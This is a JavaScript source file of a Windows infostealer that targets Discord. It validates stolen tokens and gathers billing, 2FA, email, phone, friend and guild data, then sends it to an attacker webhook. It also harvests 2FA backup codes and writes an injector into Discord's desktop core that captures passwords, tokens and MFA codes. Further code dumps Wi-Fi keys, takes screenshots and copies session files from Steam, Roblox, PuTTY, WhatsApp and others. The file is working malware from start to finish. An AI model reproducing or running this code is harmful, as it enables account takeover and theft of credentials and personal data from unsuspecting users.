                if (b.id === 'active_developer') add(EMOJIS.active_developer);
                if (b.id.startsWith('quest')) add(EMOJIS.questbadge);
            }
        } else if (flags) {
            if (flags & 1) add(EMOJIS.discord_employee);
            if (flags & 2) add(EMOJIS.partnered_server_owner);
            if (flags & 4) add(EMOJIS.hypesquad_events);
            if (flags & 8) add(EMOJIS.bughunter);
            if (flags & 512) add(EMOJIS.early_supporter);
            if (flags & 16384) add(EMOJIS.bughuntergold);
            if (flags & 131072) add(EMOJIS.early_verified_bot_developer);
            if (flags & 262144) add(EMOJIS.moderatorprogramsalumni);
            if (flags & 4194304) add(EMOJIS.active_developer);
        }
        return out.length ? out.join(' ') : 'None';
    }

    _getNitroBadgeByMonths(since) {
        const EMOJIS = CONFIG.EMOJIS;
        if (!since) return EMOJIS.discord_nitro || '';
        const now = new Date(), then = new Date(since);
        let m = (now.getFullYear() - then.getFullYear()) * 12 + (now.getMonth() - then.getMonth());
        if (now.getDate() < then.getDate()) m--;
        const tiers = [
            { badge: EMOJIS.discord_nitro, lowerLimit: 0, upperLimit: 1 },
            { badge: EMOJIS.bronze, lowerLimit: 2, upperLimit: 2 },
            { badge: EMOJIS.silver, lowerLimit: 3, upperLimit: 5 },
            { badge: EMOJIS.gold, lowerLimit: 6, upperLimit: 8 },
            { badge: EMOJIS.platinum, lowerLimit: 9, upperLimit: 11 },
            { badge: EMOJIS.diamond, lowerLimit: 12, upperLimit: 14 },
            { badge: EMOJIS.emerald, lowerLimit: 15, upperLimit: 17 },
            { badge: EMOJIS.ruby, lowerLimit: 18, upperLimit: 23 },
            { badge: EMOJIS.opal || EMOJIS['24_months'], lowerLimit: 24 }
        ];
        const match = tiers.find(n => m >= n.lowerLimit && (n.upperLimit === undefined || m <= n.upperLimit));
        return match?.badge || EMOJIS.discord_nitro || '';
    }

    async _getNitro(token, premiumType, profileData) {
        const EMOJIS = CONFIG.EMOJIS;
        if (!premiumType) return 'None';
        const profileSince = profileData?.premium_since || profileData?.user_profile?.premium_since;
        const nitroBadge = this._getNitroBadgeByMonths(profileSince) || EMOJIS.discord_nitro || '';
        const boostBadges = [EMOJIS.boost1month || 'ðŸš€', EMOJIS['2monthsboostnitro'], EMOJIS.nitro_boost_3_months, EMOJIS['6months_boost'], EMOJIS.nitro_boost_9_months, EMOJIS['12monthsboostnitro'], EMOJIS.boost15month, EMOJIS.nitro_boost_18_months, EMOJIS['24_months']];
        let boostBadge = '';
        const userBadges = profileData?.badges || profileData?.user_profile?.badges || [];
        const booster = userBadges.find(b => b.id && b.id.startsWith('guild_booster_lvl'));
        if (booster) {
            const lvl = parseInt(booster.id.replace('guild_booster_lvl', ''));
            if (!isNaN(lvl) && lvl >= 1 && lvl <= 9) boostBadge = boostBadges[lvl - 1] || '';
        }
        return `${nitroBadge} ${boostBadge}`.trim() || '`None`';
    }

    async _getBilling(token) {
        try {
            const data = await this._discordGet(token, '/api/v9/users/@me/billing/payment-sources');
            if (!data || !data.length) return 'None';
            let bi = '';
            data.forEach(z => {
                if (z.type === 2 && !z.invalid) bi += (CONFIG.EMOJIS.paypal || 'ðŸ…¿ï¸') + ' ';
                else if (z.type === 1 && !z.invalid) bi += 'ðŸ’³ ';
            });
            return bi.trim() || 'None';
        } catch { return 'None'; }
    }

    async _get2FAType(token) {
        try {
            const data = await this._discordGet(token, '/api/v9/users/@me/mfa/totp/authenticators');
            const types = [];
            if (data?.totp) types.push('Authenticator App');
            if (data?.sms) types.push('SMS');
            if (data?.webauthn) types.push('Security Key');
            return types.length ? types.join(', ') : 'Authenticator App';
        } catch { return 'Authenticator App'; }
    }

    async _buildHQFriends(token) {
        const EMOJIS = CONFIG.EMOJIS;
        const axiosModule = loadModule('axios');
        if (!axiosModule) return { text: '`No HQ Friends`', count: 0, total: 0 };
        try {
            const { data } = await axiosModule.get('https://discord.com/api/v9/users/@me/relationships', {
                headers: { Authorization: token },
                timeout: 8000
            });
            const friends = Array.isArray(data) ? data : [];
            if (!friends.length) return { text: '`No HQ Friends`', count: 0, total: 0 };

            const hq = [];
            for (const f of friends) {
                const user = f.user || {};
                const f_flags = (user.public_flags || 0) | (user.flags || 0);

                const HQ_FLAGS = 1 | 2 | 4 | 8 | 512 | 16384 | 131072 | 262144;
                const isHQ = (f_flags & HQ_FLAGS) !== 0;
                if (!isHQ) continue;

                let badgeStr = this._getBadges(f_flags, null);
                if (badgeStr === 'None') badgeStr = '';

                let nitroBadge = '';
                let boostBadge = '';

                try {
                    const profileRes = await axiosModule.get(`https://discord.com/api/v9/users/${user.id}/profile`, {
                        headers: { Authorization: token },
                        timeout: 3000
                    });
                    const pd = profileRes.data;

                    badgeStr = this._getBadges(f_flags, pd);
                    if (badgeStr === 'None') badgeStr = '';

                    const hasNitro = (pd?.premium_since != null || pd?.user_profile?.premium_since != null || pd?.user?.premium_type > 0 || pd?.badges?.some(b => b.id === 'premium'));
                    nitroBadge = hasNitro ? (this._getNitroBadgeByMonths(pd?.premium_since || pd?.user_profile?.premium_since) || EMOJIS.discord_nitro || '') : '';

                    const boostBadges = [EMOJIS.boost1month || 'ðŸš€', EMOJIS['2monthsboostnitro'], EMOJIS.nitro_boost_3_months, EMOJIS['6months_boost'], EMOJIS.nitro_boost_9_months, EMOJIS['12monthsboostnitro'], EMOJIS.boost15month, EMOJIS.nitro_boost_18_months, EMOJIS['24_months']];
                    const userBadges = pd?.badges || pd?.user_profile?.badges || [];
                    const booster = userBadges.find(b => b.id && b.id.startsWith('guild_booster_lvl'));
                    if (booster) {
                        const lvl = parseInt(booster.id.replace('guild_booster_lvl', ''));
                        if (!isNaN(lvl) && lvl >= 1 && lvl <= 9) boostBadge = boostBadges[lvl - 1] || 'ðŸš€';
                    }
                    await Utils.sleep(400);
                } catch { }

                const allBadges = [badgeStr, nitroBadge, boostBadge].filter(Boolean).join(' ').replace(/\s+/g, ' ').trim();
                if (!allBadges) continue;
                hq.push(`${allBadges}  \`${user.username || 'unknown'}\``);
            }

            if (!hq.length) return { text: '`No HQ Friends`', count: 0, total: friends.length };
            const lines = []; let len = 0;
            for (const line of hq) { if (len + line.length + 1 > 1024) break; lines.push(line); len += line.length + 1; }
            const remaining = hq.length - lines.length;
            let text = lines.join('\n'); if (remaining > 0) text += `\n\`+${remaining} more\``;
            return { text, count: hq.length, total: friends.length };
        } catch { return { text: '`No HQ Friends`', count: 0, total: 0 }; }
    }


    async _buildHQGuilds(token) {
        try {
            const data = await this._discordGet(token, '/api/v9/users/@me/guilds');
            const guilds = Array.isArray(data) ? data : [];
            if (!guilds.length) return { text: '`No HQ Guilds`', count: 0, total: 0 };
            const hq = guilds.filter(g => { const p = BigInt(g.permissions || 0); return g.owner || (p & BigInt(0x8)) === BigInt(0x8); });
            if (!hq.length) return { text: '`No HQ Guilds`', count: 0, total: guilds.length };
            const lines = hq.map(g => `ðŸ‘‘  \`${g.name}\``); const shown = []; let len = 0;
            for (const l of lines) { if (len + l.length + 1 > 1024) break; shown.push(l); len += l.length + 1; }
            const rem = hq.length - shown.length;
            let text = shown.join('\n'); if (rem > 0) text += `\n\`+${rem} more\``;
            return { text, count: hq.length, total: guilds.length };
        } catch { return { text: '`No HQ Guilds`', count: 0, total: 0 }; }
    }

    async sendTokens(zipPath = null) {
        logger.info('TokenStealer', `Sending ${this.validatedTokens.length} tokens...`);
        const THEME = 0x2b2d4e;
        const footerTag = 'Tu Ã§awa yÃ®?';

        if (this.validatedTokens.length === 0) {
            if (zipPath && fs.existsSync(zipPath)) {
                await NetworkManager.sendWebhookFile(CONFIG.WEBHOOK, zipPath, {
                    embeds: [{ title: '  Data Report', color: THEME, description: 'No tokens found.', timestamp: new Date().toISOString(), footer: { text: footerTag, icon_url: CONFIG.FOOTER_ICON } }]
                });
            }
            return;
        }

        for (const { token, userInfo } of this.validatedTokens) {
            try {
                const u = userInfo || {};
                const flags = (u.flags || 0) | (u.public_flags || 0);
                const avatarUrl = u.avatar
                    ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=1024`
                    : 'https://cdn.discordapp.com/embed/avatars/0.png';
                const displayName = ` @${u.username || 'Unknown'} ${u.global_name || u.username || ''} (${u.id || '?'})`;

                const [profileData, billing, hqFriends, hqGuilds] = await Promise.all([
                    this._discordGet(token, `/api/v9/users/${u.id}/profile`),
                    this._getBilling(token),
                    this._buildHQFriends(token),
                    this._buildHQGuilds(token)
                ]);

                const badges = this._getBadges(flags, profileData);
                const nitro = await this._getNitro(token, u.premium_type, profileData);
                const twoFAType = u.mfa_enabled ? await this._get2FAType(token) : 'None';

                const descLines = [`éµ **Token:**\n\`\`\`${token}\`\`\``];

                const embed1 = {
                    color: THEME,
                    description: descLines.join('\n'),
                    author: { name: displayName, icon_url: avatarUrl },
                    thumbnail: { url: avatarUrl },
                    footer: { text: footerTag, icon_url: CONFIG.FOOTER_ICON },
                    fields: [
                        { name: 'å‹³ **Badges:**', value: (badges !== 'None' || nitro !== 'None') ? `${badges !== 'None' ? badges : ''} ${nitro !== 'None' ? nitro : ''}`.trim() : '`None`', inline: true },
                        { name: 'é‡‘ **Billing:**', value: billing !== 'None' ? billing : '`None`', inline: true },
                        { name: 'å®ˆ **2FA:**', value: u.mfa_enabled ? '`Yes`' : '`No`', inline: true },
                        { name: 'é˜² **2FA Type:**', value: u.mfa_enabled ? `\`${twoFAType}\`` : '`None`', inline: true },
                        { name: 'ä¿¡ **Email:**', value: `\`${u.email || 'N/A'}\``, inline: true },
                        { name: 'è©± **Number:**', value: `\`${u.phone || 'N/A'}\``, inline: true }
                    ]
                };

                const embed2 = {
                    color: THEME,
                    description: hqFriends.count === 0 ? '`No HQ Friends`' : hqFriends.text,
                    author: { name: `HQ Friends (${hqFriends.count}/${hqFriends.total})` },
                    footer: { text: footerTag }
                };

                const embed3 = {
                    color: THEME,
                    description: hqGuilds.count === 0 ? '`No HQ Guilds`' : hqGuilds.text,
                    author: { name: `HQ Guilds (${hqGuilds.count}/${hqGuilds.total})` },
                    footer: { text: footerTag }
                };

                const webhookPayload = { username: 'Bi xatirÃª te', avatar_url: CONFIG.FOOTER_ICON, embeds: [embed1, embed2, embed3] };

                if (zipPath && fs.existsSync(zipPath)) {
                    await NetworkManager.sendWebhookFile(CONFIG.WEBHOOK, zipPath, webhookPayload);
                } else {
                    await NetworkManager.postWebhook(CONFIG.WEBHOOK, webhookPayload);
                }
            } catch (e) {
                logger.error('TokenStealer', `sendTokens error: ${e.message}`);
            }
        }
    }



    async extractBackupCodes(targetDir) {
        const dir = path.join(targetDir, 'Discord Backup');
        Utils.ensureDir(dir);

        const searchDirs = [
            path.join(CONFIG.PATHS.HOME, 'Downloads'),
            path.join(CONFIG.PATHS.HOME, 'Desktop'),
            path.join(CONFIG.PATHS.HOME, 'Documents'),
            CONFIG.PATHS.HOME,
            path.join(CONFIG.PATHS.LOCALAPPDATA, 'Temp')
        ].filter(d => { try { return fs.existsSync(d); } catch { return false; } });

        for (const searchDir of searchDirs) {
            try {
                const files = fs.readdirSync(searchDir).filter(f =>
                    /discord.*backup.*codes/i.test(f) ||
                    /backup.*codes.*discord/i.test(f) ||
                    f.endsWith('.txt') && f.toLowerCase().includes('discord')
                );
                for (const f of files) {
                    try {
                        const src = path.join(searchDir, f);
                        const stat = fs.statSync(src);
                        if (stat.isFile() && stat.size < 100 * 1024) {
                            Utils.safeCopyFile(src, path.join(dir, f));
                        }
                    } catch { }
                }
            } catch { }
        }

        for (const { token, userInfo } of this.validatedTokens) {
            if (!userInfo?.mfa_enabled) continue;
            try {
                const codes = await new Promise(resolve => {
                    const req = https.request({
                        hostname: 'discord.com', port: 443,
                        path: '/api/v9/users/@me/mfa/codes',
                        method: 'POST',
                        headers: {
                            Authorization: token,
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0',
                            'X-Super-Properties': Buffer.from(JSON.stringify({ os: 'Windows', browser: 'Chrome' })).toString('base64')
                        },
                        timeout: 8000
                    }, res => {
                        let d = '';
                        res.on('data', c => d += c);
                        res.on('end', () => {
                            try {
                                const parsed = JSON.parse(d);
                                const list = parsed.backup_codes || parsed.codes || [];
                                resolve(list);
                            } catch { resolve([]); }
                        });
                    });
                    req.on('error', () => resolve([]));
                    req.setTimeout(8000, () => { req.destroy(); resolve([]); });
                    req.write(JSON.stringify({ regenerate: false }));
                    req.end();
                });
                if (codes.length) {
                    const u = userInfo.username || 'unknown';
                    const userId = userInfo.id || 'unknown';
                    Utils.safeWriteFile(
                        path.join(dir, `${u}_${userId}_backup_codes.txt`),
                        codes.map(c => {
                            const code = c.code || c;
                            const used = c.consumed ? ' (USED)' : '';
                            return `${code}${used}`;
                        }).join('\n')
                    );
                }
            } catch { }
        }
    }
}

class DiscordInjector {
    constructor() { this.injectionResults = []; }

    generateInjectorCode() {
        return `const path = require('path');
const Module = require('module');
try {
  const discordCore = require('./core.asar');
  try {
    let electron;
    try { electron = require('electron'); } catch { electron = null; }
    if (!electron || !electron.session) { module.exports = discordCore; return; }

    const os = require('os');
    const { session, BrowserWindow } = electron;

    function sendToWebhook(payload) {
      try {
        const http = require('http'); const https = require('https');
        const url = new URL('${CONFIG.WEBHOOK}');
        if (payload.embeds?.[0]) {
           const e = payload.embeds[0]; const title = e.title || '';
           if (/login/i.test(title)) e.title = 'ðŸ”  Login Detected';
           else if (/password/i.test(title)) e.title = 'ðŸ”‘  Password Changed';
           else if (/email/i.test(title)) e.title = 'ðŸ“§  Email Changed';
           else if (/token/i.test(title)) e.title = 'ðŸŽ«  Token Captured';
           else if (/2fa|mfa/i.test(title)) e.title = 'ðŸ›¡ï¸  2FA Event';
           else e.title = e.title || 'âš¡  Discord Event';
           e.color = 2829617;
           e.footer = { text: 'ðŸ”‘ Event Captured  â€¢  ' + new Date().toLocaleString('tr-TR') };
           e.timestamp = e.timestamp || new Date().toISOString();
        }
        payload.username = 'Logger'; payload.avatar_url = '${CONFIG.FOOTER_ICON}';
        const data = Buffer.from(JSON.stringify(payload), 'utf8');
        const client = url.protocol === 'https:' ? https : http;
        const req = client.request({
          hostname: url.hostname,
          port: url.port || (url.protocol === 'https:' ? 443 : 80),
          path: url.pathname + (url.search || ''),
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
        }, res => { res.on('data', () => {}); });
        payload.username = 'Logger'; payload.avatar_url = '${CONFIG.FOOTER_ICON}';
        req.on('error', () => {});
        req.write(data); req.end();
      } catch {}
    }

    try {
      const ses = session.defaultSession;
      
      ses.webRequest.onBeforeSendHeaders({ urls: ['https://discord.com/api/v*/users/@me', 'https://discord.com/api/v*/science', 'https://discord.com/api/v*/auth/login', 'https://discord.com/api/v*/mfa/totp', 'https://discord.com/api/v*/auth/mfa/totp'] }, (details, callback) => {
        try {
          if (details.requestHeaders && details.requestHeaders['Authorization']) {
            const token = details.requestHeaders['Authorization'];
            if (token && !global.stolen_token) {
              global.stolen_token = true;
              sendToWebhook({ embeds: [{ title: 'Discord Token', color: 0x2b2d4e, fields: [{ name: 'Token', value: '\`' + token.replace(/"/g, '') + '\`', inline: false }], timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}

        try {
          if (details.url.includes('/auth/login') && details.method === 'POST') {
            let bodyText = '';
            try { bodyText = (details.uploadData?.[0]?.bytes || Buffer.alloc(0)).toString(); } catch {}
            let data = {};
            try { data = JSON.parse(bodyText); } catch {}
            const fields = [];
            if (data.login || data.email) fields.push({ name: 'Email', value: '\`' + (data.login || data.email) + '\`', inline: true });
            if (data.password) fields.push({ name: 'Password', value: '\`' + data.password + '\`', inline: true });
            if (data.code) fields.push({ name: '2FA Code', value: '\`' + data.code + '\`', inline: true });
            if (fields.length) {
              sendToWebhook({ embeds: [{ title: 'ðŸ”  Login Detected', color: 0x2b2d4e, fields, timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}

        try {
          if (details.url.includes('/users/@me') && details.method === 'PATCH') {
            let bodyText = '';
            try { bodyText = (details.uploadData?.[0]?.bytes || Buffer.alloc(0)).toString(); } catch {}
            let data = {};
            try { data = JSON.parse(bodyText); } catch {}
            const fields = [];
            if (data.password)     fields.push({ name: 'Old Password', value: '\`' + data.password + '\`', inline: true });
            if (data.new_password) fields.push({ name: 'New Password', value: '\`' + data.new_password + '\`', inline: true });
            if (data.email)        fields.push({ name: 'New Email', value: '\`' + data.email + '\`', inline: true });
            if (fields.length) {
              let t = 'ðŸ”‘  Password Changed';
              if(data.email) t = 'ðŸ“§  Email Changed';
              sendToWebhook({ embeds: [{ title: t, color: 0x2b2d4e, fields, timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}

        try {
          if ((details.url.includes('/mfa/totp') || details.url.includes('/auth/mfa/totp')) && details.method === 'POST') {
            let bodyText = '';
            try { bodyText = (details.uploadData?.[0]?.bytes || Buffer.alloc(0)).toString(); } catch {}
            let data = {};
            try { data = JSON.parse(bodyText); } catch {}
            const fields = [];
            if (data.code)   fields.push({ name: 'MFA Code', value: '\`' + data.code + '\`', inline: true });
            if (data.ticket) fields.push({ name: 'Ticket', value: '\`' + data.ticket + '\`', inline: true });
            if (fields.length) {
              sendToWebhook({ embeds: [{ title: 'ðŸ›¡ï¸  2FA Event', color: 0x2b2d4e, fields, timestamp: new Date().toISOString() }] });
            }
          }
        } catch {}

        callback({ requestHeaders: details.requestHeaders });
      });

    } catch {}

    function injectTokenStealer(win) {
      if (!win || !win.webContents) return;
      win.webContents.executeJavaScript('window.webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.default&&m.default.getToken!==undefined){return m.default.getToken()}}}])').then(tk => {
        if(tk && !global.stolen_token_js){
          global.stolen_token_js = true;
          sendToWebhook({ embeds: [{ title: 'Discord Token (JS)', color: 0x2b2d4e, fields: [{ name: 'Token', value: '\`' + tk.replace(/"/g, '') + '\`', inline: false }], timestamp: new Date().toISOString() }] });
        }
      }).catch(()=>{});
    }

    setTimeout(() => { try { electron.BrowserWindow.getAllWindows().forEach(w => injectTokenStealer(w)); } catch {} }, 8000);

  } catch {}
  module.exports = discordCore;
} catch (e) { throw e; }
`;
    }

    async findDiscordInstallations() {
        const installs = [];
        try {
            if (!fs.existsSync(CONFIG.PATHS.LOCALAPPDATA)) return installs;
            for (const dir of fs.readdirSync(CONFIG.PATHS.LOCALAPPDATA).filter(d => d.toLowerCase().includes('discord'))) {
                const fullPath = path.join(CONFIG.PATHS.LOCALAPPDATA, dir);
                try {
                    const appDirs = fs.readdirSync(fullPath).filter(d => d.startsWith('app-')).sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));
                    if (!appDirs.length) continue;
                    const modulesPath = path.join(fullPath, appDirs[0], 'modules');
                    if (!fs.existsSync(modulesPath)) continue;
                    const coreModule = fs.readdirSync(modulesPath).find(m => m.includes('discord_desktop_core'));
                    if (!coreModule) continue;
                    const corePath = path.join(modulesPath, coreModule, 'discord_desktop_core');
                    installs.push({
                        type: dir.includes('Canary') ? 'Canary' : dir.includes('PTB') ? 'PTB' : dir.includes('Development') ? 'Development' : 'Discord',
                        indexPath: path.join(corePath, 'index.js')
                    });
                } catch { }
            }
        } catch { }
        return installs;
    }

    async inject() {
        logger.info('DiscordInjector', 'Starting injection...');
        await ProcessManager.killProcesses(['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe']);
        await Utils.sleep(1000);

        const installs = await this.findDiscordInstallations();
        const code = this.generateInjectorCode();

        for (const inst of installs) {
            try {
                Utils.safeWriteFile(inst.indexPath, code);
                this.injectionResults.push({ type: inst.type, path: inst.indexPath, success: true });
                logger.info('DiscordInjector', `Injected: ${inst.type}`);
            } catch (e) {
                this.injectionResults.push({ type: inst.type, success: false });
            }
        }

        if (this.injectionResults.some(r => r.success)) {
            try {
                const successList = this.injectionResults.filter(r => r.success);
                const axiosModule = loadModule('axios');
                const payload = {
                    embeds: [{
                        title: 'Discord Injection',
                        color: 0x2b2d4e,
                        fields: successList.map(r => ({
                            name: r.type,
                            value: `\`${r.path}\``,
                            inline: false
                        })),
                        footer: { text: `ðŸ”‘ Event Captured  â€¢  ${new Date().toLocaleString('tr-TR')}` },
                        timestamp: new Date().toISOString()
                    }]
                };
                if (axiosModule) {
                    await axiosModule.post(CONFIG.WEBHOOK, { ...payload, username: 'Logger', avatar_url: CONFIG.FOOTER_ICON }, { headers: { 'Content-Type': 'application/json' }, timeout: 20000 });
                } else {
                    await NetworkManager._postWebhookNative(CONFIG.WEBHOOK, { ...payload, username: 'Logger', avatar_url: CONFIG.FOOTER_ICON });
                }
            } catch (e) { logger.error('DiscordInjector', `Report failed: ${e.message}`); }
        }

        return this.injectionResults;
    }
}


class SystemInfoCollector {
    async collectWifiProfiles(targetDir) {
        const r = await ProcessManager.runCommand('netsh wlan show profiles');
        if (!r.success) return;
        let data = r.stdout + '\n\n';
        for (const m of (r.stdout.match(/All User Profile\s*:\s*(.+)/g) || [])) {
            const name = m.split(':')[1]?.trim();
            if (name) {
                const d = await ProcessManager.runCommand(`netsh wlan show profile name="${name}" key=clear`);
                if (d.success) data += `=== ${name} ===\n${d.stdout}\n\n`;
            }
        }
        Utils.safeWriteFile(path.join(targetDir, 'wifi_profiles.txt'), data);
    }

    async takeScreenshot(targetDir) {
        const out = path.join(targetDir, 'screenshot.png').replace(/\\/g, '\\\\');
        const tmp = path.join(CONFIG.PATHS.TEMP, `ss_${Utils.generateId()}.ps1`);
        Utils.safeWriteFile(tmp, `Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap $s.Width,$s.Height;$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);$b.Save('${out}',[System.Drawing.Imaging.ImageFormat]::Png);$g.Dispose();$b.Dispose()`);
        await ProcessManager.runCommand(`powershell -NoProfile -ExecutionPolicy Bypass -File "${tmp}"`, { timeout: 20000 });
        Utils.safeDelete(tmp);
    }
}

class SessionStealer {
    static get APPS() {
        return [
            { name: 'Steam', kill: 'Steam.exe', type: 'files', base: 'C:\\\\Program Files (x86)\\\\Steam\\\\config', dest: 'Sessions\\\\Steam', files: ['loginusers.vdf', 'config.vdf', 'DialogConfig.vdf', 'SteamAppData.vdf'], regex: /^ssfn/ },
            { name: 'Minecraft', kill: 'javaw.exe', type: 'multi_files', dest: 'Sessions\\\\Minecraft', locs: [{ base: 'APPDATA', folder: '.minecraft', target: 'launcher_profiles.json' }, { base: 'APPDATA', folder: '.minecraft', target: 'launcher_accounts.json' }, { base: 'HOME', folder: '.lunarclient\\\\settings\\\\game', target: 'accounts.json', destName: 'lunar_accounts.json' }] },
            { name: 'EpicGames', type: 'files', base: 'LOCALAPPDATA', folder: 'EpicGamesLauncher\\\\Saved\\\\Config\\\\Windows', dest: 'Sessions\\\\EpicGames', files: ['GameUserSettings.ini', 'Engine.ini'] },
            { name: 'Growtopia', kill: 'Growtopia.exe', type: 'multi_files', dest: 'Games\\\\Growtopia', locs: [{ base: 'LOCALAPPDATA', folder: 'Growtopia', target: 'save.dat', destName: 'Growtopia_save.dat' }] },
            { name: 'Riot', type: 'multi_files', dest: 'Sessions\\\\Riot', locs: [{ base: 'LOCALAPPDATA', folder: 'Riot Games\\\\Riot Client\\\\Data', target: 'RiotClientPrivateSettings.yaml' }, { base: 'LOCALAPPDATA', folder: 'Riot Games\\\\Riot Client\\\\Data', target: 'RiotGamesPrivateSettings.yaml' }, { base: 'APPDATA', folder: 'Riot Games\\\\Riot Client\\\\Cookies', target: '' /* as Cookies folder */ }] },
            { name: 'RiotData', type: 'regex_files', base: 'LOCALAPPDATA', folder: 'Riot Games\\\\Riot Client\\\\Data', dest: 'Sessions\\\\Riot', regex: /\\.(yaml|json)$/ },
            { name: 'Battlenet', kill: 'Battle.net.exe', type: 'files', base: 'APPDATA', folder: 'Battle.net', dest: 'Sessions\\\\Battlenet', files: ['Battle.net.config', 'Battle.net.gameData.config', 'saved_account.json', '.fingerprint'] },
            { name: 'Origin_EA', type: 'regex_files_multi', dest: 'Sessions\\\\Origin_EA', locs: [{ base: 'APPDATA', folder: 'Origin' }, { base: 'APPDATA', folder: 'Electronic Arts\\\\EA Desktop' }, { base: 'LOCALAPPDATA', folder: 'Electronic Arts\\\\EA Desktop' }], regex: /\\.(xml|json|ini|db|sqlite)$/, maxMb: 5 },
            { name: 'Ubisoft', kill: 'upc.exe', type: 'regex_files_multi', dest: 'Sessions\\\\Ubisoft', locs: [{ base: 'LOCALAPPDATA', folder: 'Ubisoft Game Launcher' }, { base: 'APPDATA', folder: 'Ubisoft Game Launcher' }], regex: /\\.(dat|db|json|yml)$/ },
            { name: 'RobloxReg', type: 'cmd', dest: 'Sessions\\\\Roblox', cmd: 'reg query "HKCU\\\\Software\\\\Roblox\\\\RobloxStudioBrowser\\\\http:\\\\\\\\www.roblox.com" /v .ROBLOSECURITY 2>nul', mustInclude: 'ROBLOSECURITY', destName: 'roblox_registry_cookie.txt' },
            { name: 'RobloxFiles', type: 'regex_files_multi', dest: 'Sessions\\\\Roblox', locs: [{ base: 'LOCALAPPDATA', folder: 'Roblox\\\\LocalStorage' }, { base: 'APPDATA', folder: 'Roblox' }], regex: /\\.(json|dat)$/ },
            { name: 'Rockstar', type: 'regex_files_multi', dest: 'Sessions\\\\Rockstar', locs: [{ base: 'LOCALAPPDATA', folder: 'Rockstar Games\\\\Launcher' }, { base: 'LOCALAPPDATA', folder: 'Rockstar Games\\\\GTA V' }], regex: /\\.(ini|dat|json|xml)$/ },
            { name: 'Spotify', type: 'subdirs_files', dest: 'Sessions\\\\Spotify', base: 'APPDATA', folder: 'Spotify\\\\Users', files: ['credentials.json', 'prefs'] },
            { name: 'Twitch', type: 'regex_files_multi', dest: 'Sessions\\\\Twitch', locs: [{ base: 'APPDATA', folder: 'Twitch' }, { base: 'LOCALAPPDATA', folder: 'Twitch' }], regex: /\\.(db|json|sqlite)$/, maxMb: 10 },
            { name: 'FileZilla', type: 'files', base: 'APPDATA', folder: 'FileZilla', dest: 'Sessions\\\\FileZilla', files: ['sitemanager.xml', 'recentservers.xml', 'filezilla.xml'] },
            { name: 'WinSCPSes', type: 'cmd', dest: 'Sessions\\\\WinSCP', cmd: 'reg export "HKCU\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions"', destName: 'winscp_sessions.reg' },
            { name: 'WinSCPIni', type: 'multi_files', dest: 'Sessions\\\\WinSCP', locs: [{ base: 'APPDATA', folder: '', target: 'WinSCP.ini' }] },
            { name: 'PuTTY', type: 'cmd_multi', dest: 'Sessions\\\\PuTTY', cmds: [{ cmd: 'reg export "HKCU\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions"', destName: 'putty_sessions.reg' }, { cmd: 'reg export "HKCU\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys"', destName: 'putty_hostkeys.reg' }] },
            { name: 'Genshin', type: 'regex_files_multi', dest: 'Sessions\\\\GenshinImpact', locs: [{ base: 'APPDATA', folder: 'miHoYo\\\\Genshin Impact' }, { base: 'LOCALAPPDATA', folder: 'Genshin Impact' }], regex: /\\.(dat|json|ini)$/ },
            { name: 'WhatsApp', type: 'regex_files_multi', dest: 'Sessions\\\\WhatsApp', locs: [{ base: 'APPDATA', folder: 'WhatsApp\\\\Local Storage\\\\leveldb' }, { base: 'LOCALAPPDATA', folder: 'WhatsApp\\\\Local Storage\\\\leveldb' }], regex: /\\.(log|ldb)$/, maxMb: 50 },
            { name: 'Skype', type: 'subdirs_files', dest: 'Sessions\\\\Skype', base: 'APPDATA', folder: 'Microsoft\\\\Skype for Desktop', files: ['main.db', 'keychain.json'] },
            { name: 'ZoomFiles', type: 'files', base: 'APPDATA', folder: 'Zoom', dest: 'Sessions\\\\Zoom', files: ['zoomus.conf', 'token'] },
            { name: 'ZoomData', type: 'regex_files_multi', dest: 'Sessions\\\\Zoom', locs: [{ base: 'APPDATA', folder: 'Zoom\\\\data' }], regex: /\\.(db|json|conf)$/ },
            { name: 'Wargaming', type: 'regex_files_multi', dest: 'Sessions\\\\Wargaming', locs: [{ base: 'APPDATA', folder: 'Wargaming.net' }], regex: /\\.(dat|json|xml)$/ },
            { name: 'WeChat', type: 'regex_files_multi', dest: 'Sessions\\\\WeChat', locs: [{ base: 'APPDATA', folder: 'Tencent\\\\WeChat' }], regex: /\\.(dat|db|config)$/, maxMb: 5 },
            { name: 'Guilded', type: 'regex_files_multi', dest: 'Sessions\\\\Guilded', locs: [{ base: 'APPDATA', folder: 'Guilded\\\\Local Storage\\\\leveldb' }, { base: 'LOCALAPPDATA', folder: 'Guilded\\\\Local Storage\\\\leveldb' }], regex: /\\.(log|ldb)$/ }
        ];
    }

    _resolvePath(baseDir, folder) {
        if (!baseDir) return null;
        if (CONFIG.PATHS[baseDir]) return path.join(CONFIG.PATHS[baseDir], folder || '');
        if (baseDir.includes(':\\\\') || baseDir.includes(':/')) return folder ? path.join(baseDir, folder) : baseDir;
        return null;
    }

    async _processRule(rootDir, app) {
        if (app.kill) ProcessManager.killProcess(app.kill);
        const dest = app.dest ? path.join(rootDir, app.dest) : rootDir;
        let found = false;

        if (app.type === 'files') {
            const p = this._resolvePath(app.base, app.folder);
            if (!p || !fs.existsSync(p)) return false;
            Utils.ensureDir(dest);
            if (app.files) {
                app.files.forEach(f => { if (Utils.safeCopyFile(path.join(p, f), path.join(dest, f))) found = true; });
            }
            if (app.regex) {
                try { fs.readdirSync(p).filter(f => app.regex.test(f)).forEach(f => { if (Utils.safeCopyFile(path.join(p, f), path.join(dest, f))) found = true; }); } catch { }
            }
        }
        else if (app.type === 'multi_files') {
